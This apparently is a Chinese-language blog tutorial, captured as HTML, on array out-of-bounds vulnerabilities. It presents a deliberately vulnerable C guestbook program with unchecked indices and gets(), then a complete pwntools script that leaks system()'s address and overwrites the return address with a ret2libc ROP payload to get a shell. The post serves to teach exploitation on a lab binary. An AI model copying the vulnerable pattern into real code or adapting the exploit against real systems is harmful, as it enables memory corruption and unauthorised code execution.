+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.leeyuxun.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
+  </script>
+
+  <meta name="description" content="基础知识数组的原理 数组是内存中一段连续的存储空间，一个数组中包含多个类型相同的数组元素； 数组通过数组名在内存中找到对应的数组空间； 数组元素通过数组名和索引获取；">
+<meta property="og:type" content="article">
+<meta property="og:title" content="二进制-数组越界漏洞">
+<meta property="og:url" content="https://www.leeyuxun.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E.html">
+<meta property="og:site_name" content="Leeyuxun の blog">
+<meta property="og:description" content="基础知识数组的原理 数组是内存中一段连续的存储空间，一个数组中包含多个类型相同的数组元素； 数组通过数组名在内存中找到对应的数组空间； 数组元素通过数组名和索引获取；">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210210100132.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210223113130.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210223114222.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210223175347.png">
+<meta property="og:image" content="https://www.leeyuxun.github.io/Users/leeyuxun/Library/Application%20Support/typora-user-images/image-20210223175837035.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210302150912.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210302154218.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210302155427.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210302152456.png">
+<meta property="article:published_time" content="2021-02-10T01:51:59.000Z">
+<meta property="article:modified_time" content="2021-03-02T07:55:56.408Z">
+<meta property="article:author" content="李钰璕">
+<meta property="article:tag" content="数组越界">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210210100132.png">
+
+<link rel="canonical" href="https://www.leeyuxun.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>二进制-数组越界漏洞 | Leeyuxun の blog</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163555158-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Leeyuxun の blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">BUPT | SCSS</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.leeyuxun.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="李钰璕">
+      <meta itemprop="description" content="从0开始学习网络安全">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leeyuxun の blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          二进制-数组越界漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-02-10 09:51:59" itemprop="dateCreated datePublished" datetime="2021-02-10T09:51:59+08:00">2021-02-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-02 15:55:56" itemprop="dateModified" datetime="2021-03-02T15:55:56+08:00">2021-03-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">二进制学习</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="数组的原理"><a href="#数组的原理" class="headerlink" title="数组的原理"></a>数组的原理</h2><ul>
+<li>数组是内存中一段连续的存储空间，一个数组中包含多个类型相同的数组元素；</li>
+<li>数组通过数组名在内存中找到对应的数组空间；</li>
+<li>数组元素通过数组名和索引获取；<a id="more"></a></li>
+</ul>
+<p>如下程序定义了含有10个元素的数组a，依次打印出数组元素的地址；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a's address: %p\n"</span>, &amp;a);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        a[i] = i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"a[%d]'s address: %p\n"</span>, i, &amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行结果显示，各个元素之间的地址相差一个int类型数值的大小，a[4]的地址与a的地址相 差0x10个字节，即4*sizeof(int)大小；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210210100132.png" style="zoom:40%;" /></p>
+<p>通过IDA的反汇编进一步明确元素的寻址方式，IDA能够获取各个变量用ebp表示出的地址，数组a的地址为<code>ebp-0x34</code>；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210223113130.png" style="zoom:50%;" /></p>
+<p>下图汇编语言中，变量i的地址是<code>ebp-0x0C</code>，将i的值赋给eax和edx，然后将edx的值赋给数组元素；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210223114222.png" style="zoom:50%;" /></p>
+<p>每个数组元素的地址为<code>ebp-0x34+eax*4</code>，其中<code>ebp-0x34</code>是数组a的地址，<code>eax*4</code>是索引<code>i*sizeof(int)</code>；</p>
+<p>因此，确定<strong>数组元素寻址方式</strong>为<code>数组地址+索引*数组元素大小</code>；</p>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>C和C++不对数组做边界检查，除了语言对编程人员信任和程序性能的顾虑外，C和C++的数组边界检查本身也是一件困难的事情：</p>
+<ul>
+<li>数组越界的判定不仅依赖于下标的值，也依赖于指针的类型；</li>
+<li>对于指向数组的指针来说，在程序中若没有显式的指明数组长度，还需要证明其地址计算结果位于该数组内；</li>
+<li>程序运行时，数组可能重新进行了动态分配，长度发生了变化；</li>
+</ul>
+<p>这些情况使得边界检查将会给程序性能带来极大的负担，C和C++中并不能很好的防范数组越界漏洞；</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="漏洞源码"><a href="#漏洞源码" class="headerlink" title="漏洞源码"></a>漏洞源码</h2><p>以如下程序为例进行漏洞分析；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* guestbook.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> **tmp;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *sys;</span><br><span class="line">    <span class="keyword">int</span> flag;</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">char</span> *dest[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">int</span> choice;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x14</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Please setup your guest book"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">3</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Name for guest: #%d\n&gt;&gt;&gt;"</span>,i);</span><br><span class="line">        name = <span class="built_in">malloc</span>(<span class="number">0xf</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%15s"</span>,name);</span><br><span class="line">        getchar();</span><br><span class="line">        name[<span class="number">14</span>]=<span class="number">0</span>;</span><br><span class="line">        dest[i]=name;</span><br><span class="line">    &#125;</span><br><span class="line">    tmp = dest;</span><br><span class="line">    sys = &amp;system;</span><br><span class="line">    flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(flag)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"---------------------------"</span>);</span><br><span class="line">    	<span class="built_in">puts</span>(<span class="string">"1: View name"</span>);</span><br><span class="line">    	<span class="built_in">puts</span>(<span class="string">"2: Change name"</span>);</span><br><span class="line">    	<span class="built_in">puts</span>(<span class="string">"3. Quit"</span>);</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"&gt;&gt;"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;choice);</span><br><span class="line">        getchar();</span><br><span class="line">		<span class="keyword">switch</span>(choice)&#123;</span><br><span class="line">	    	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"Which entry do you want to view?\n&gt;&gt;&gt;"</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;num);</span><br><span class="line">                getchar();</span><br><span class="line">                <span class="keyword">if</span>(num&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                	<span class="built_in">puts</span>(dest[num]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">"Enter a valid number"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//readName(dest);</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Which entry do you want to change?\n&gt;&gt;&gt;"</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;num);</span><br><span class="line">                getchar();</span><br><span class="line">                <span class="keyword">if</span>(num&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                     <span class="built_in">printf</span>(<span class="string">"Enter the name of the new guest.\n&gt;&gt;&gt;"</span>);</span><br><span class="line">                     gets(&amp;s);</span><br><span class="line">                     <span class="built_in">strcpy</span>(dest[num], &amp;s);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">"Enter a valid number"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                flag = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"Not a valid option. Try again"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul>
+<li>代码实现了简单的查看名字和修改名字的功能，用户输入4个名字后，把字符串所在的地址存入指针数组dest中；</li>
+<li>在case1中，通过输入序号查看对应的名字;</li>
+<li>在case2中，通过输入序号修改对应的名字；</li>
+<li>这两个环节没有对输入的序号做检查，由于数组dest只有4个元素，当输入的序号大于3或小于0，都会造成数组越界；</li>
+</ul>
+<p>运行guestbook</p>
+<ul>
+<li><p>查看功能输入大于3的序号，会输出乱码；</p>
+</li>
+<li><p>修改功能输入大于3的序号则会出现段错误；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210223175347.png" style="zoom:40%;" /></p>
+</li>
+</ul>
+<p>由此判断本程序中的<strong>数组越界漏洞</strong>能够<strong>对内存进行查看和修改</strong>；</p>
+<h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><p>程序中sys变量记录了system函数的地址，利用的思路是，通过数组越界读取sys变量的值即system函数的地址，并利用数组越界构造ROP覆写返回地址为system函数，最终获取shell：</p>
+<ul>
+<li><p>读取system地址：</p>
+<p>程序中将system函数的地址写在了sys变量里，通过IDA来查看该变量的地址；</p>
+<p><img src="/Users/leeyuxun/Library/Application Support/typora-user-images/image-20210223175837035.png" alt="image-20210223175837035" style="zoom:50%;" /></p>
+<ul>
+<li>s[4]即为dest数组的地址为<code>ebp-0x2C</code>；</li>
+<li>V5记录了system的地址，为<code>ebp-0x1C</code>；</li>
+</ul>
+</li>
+</ul>
+<p>结合gdb调试进行进一步观察 ，在system地址赋值之后设置断点，查看栈中内容如下</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210302150912.png" style="zoom:50%;" /></p>
+<ul>
+<li>数组dest中存放字符串地址，接下来是system地址和dest地址；</li>
+<li>由于数组dest的参数是字符串地址，为了读出system地址，输入序号5，这样越过数组dest的边界覆盖了紧邻的<code>0xffffcfbc</code>，即dest数组的地址；</li>
+<li>puts函数会在遇到<code>\0</code>时停止输出，因此可以从<code>0xffffcfbc</code>一直往后读直到遇到结束符<code>\0</code>，里面就包含了system函数地址；</li>
+</ul>
+<h2 id="构造ROP劫持程序流"><a href="#构造ROP劫持程序流" class="headerlink" title="构造ROP劫持程序流"></a>构造ROP劫持程序流</h2><ul>
+<li><p>除了利用数组越界读取数据，还可以对栈中内容进行覆写；</p>
+</li>
+<li><p>构造一个ROP，让<code>function</code>函数返回时执行system函数，从而获取shell；</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rop = p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(binsh_addr)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x2c</span> + p32(<span class="number">0xdeadbeef</span>) + rop</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在修改名字时仍然选择序号5，为了能够将ROP覆写从返回地址的位置，填充从<code>0xffffcfbc</code>到返回地址之间的内存；</p>
+</li>
+</ul>
+<p>payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">r= process(<span class="string">"./guestbook"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">'A'</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">'B'</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">'C'</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">'D'</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">data = r.recv(<span class="number">20</span>)</span><br><span class="line">system = u32(data[<span class="number">-4</span>:])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]system:0x%x"</span> %system</span><br><span class="line"></span><br><span class="line">l = ELF(<span class="string">"./guestbook"</span>).libc</span><br><span class="line">l.address = system - l.symbols[<span class="string">'system'</span>]</span><br><span class="line">print(<span class="string">"[*]base: 0x%x"</span> % l.address)</span><br><span class="line"></span><br><span class="line">binsh = l.search(<span class="string">"/bin/sh\x00"</span>).next()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]binsh:0x%x"</span> %binsh</span><br><span class="line"></span><br><span class="line">rop = p32(system)+p32(<span class="number">0xdeadbeef</span>)+p32(binsh)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x2c</span> + p32(<span class="number">0xdeadbeef</span>) + rop</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"2"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"3"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>调试payload，覆写后的栈内容如下；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210302154218.png" style="zoom:50%;" /></p>
+</li>
+<li><p>在退出函数之前，会执行leave指令，相当于执行<code>mov esp,ebp; pop ebp;</code></p>
+<ul>
+<li>如下图所示，即先将esp赋值为ebp的值<code>0xffa19f1c</code>，然后将弹出的<code>0xdeadbeef</code>赋值给ebp；</li>
+</ul>
+</li>
+<li><p>接着执行ret指令，相当于执行<code>pop eip,eip;</code>，就会指向system函数地址，esp则向下移动到<code>0xffa19f24</code>处；</p>
+</li>
+<li><p>跟踪进入system函数后，后续将先执行<code>sub esp,0xc;</code>，然后通过<code>esp+0x10</code>查找system函数的参数，此时esp为<code>0xffa19f24-0xc = 0xffa19f18</code>，<code>esp+0x10</code>即为<code>0xffa19f28</code>，正好为写入<code>/bin/sh</code>字符串的地址处；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210302155427.png" style="zoom:50%;" /></p>
+</li>
+</ul>
+<p>执行payload，成功拿到sh权限；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210302152456.png" style="zoom:50%;" /></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <link href="css/font-awesome.min.css?v=4.7.0" rel="stylesheet">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  <p><span>本文标题: </span><a href="/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E.html">二进制-数组越界漏洞</a></p>
+  <p><span>文章作者: </span><a href="/" title="访问 李钰璕 的个人博客">李钰璕</a></p>
+  <p><span>发布时间: </span>2021年02月10日 - 09:51</p>
+  <p><span>最后更新: </span>2021年03月02日 - 15:55</p>
